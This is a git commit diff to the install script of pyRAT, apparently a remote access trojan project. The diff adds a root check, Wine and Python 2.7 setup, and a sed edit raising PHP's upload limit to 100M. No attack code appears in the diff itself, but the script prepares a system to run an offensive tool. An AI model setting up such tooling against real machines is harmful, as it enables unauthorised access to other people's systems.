00aedef7bfebac6905fa1a7aadb02bc4f35f5942
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2019-02-11 09:27:51 -0200

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,7 +3,14 @@
 # Coded by @linux_choice (Don't change! Read the License!)
 # Github: https://github.com/thelinuxchoice/pyRAT
 
+if [[ "$(id -u)" -ne 0 ]]; then
+    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
+    exit 1
+fi
+
 command -v wine > /dev/null 2>&1 || { echo >&2 "I require wine but it's not installed. Installing..."; apt-get update && apt-get install wine; } 
+
+if [[ ! -d ~/.wine/drive_c/Python27/ ]]; then
 
 printf "\e[1;93mDownloading Python2.7\e[0m\n"
 wget https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
@@ -14,4 +21,12 @@ dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 cd ~/.wine/drive_c/Python27/
 printf "\e[1;93mInstalling Python2.7 dependencies\e[0m\n"
 wine python.exe Scripts/pip.exe install pyinstaller paramiko
+
+else
+exit 1
+fi
+
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Configuring PHP (php.ini)\n"
+sed -i -e 's+upload_max_filesize = 2M+upload_max_filesize = 100M+g' $(php -i | grep -i "loaded configuration file" | cut -d ">" -f2)
+
 printf "\e[1;92mDone!\e[0m\n"
